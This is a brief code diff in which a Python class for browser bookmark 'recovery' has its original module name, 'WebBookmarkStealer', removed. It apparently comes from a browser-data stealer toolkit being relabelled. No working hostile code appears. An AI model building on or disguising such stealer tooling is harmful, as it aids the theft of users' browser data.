@@ -8,7 +8,7 @@ from config import ModuleManager
 
 class WebBookmarksRecovery(ModuleManager):
     def __init__(self) -> None:
-        super().__init__(module_name="WebBookmarkStealer", module_path="browsers/bookmarks")
+        super().__init__(module_path="browsers/bookmarks")
         
         self.banner(r"""
      _______         ______              _                       _          
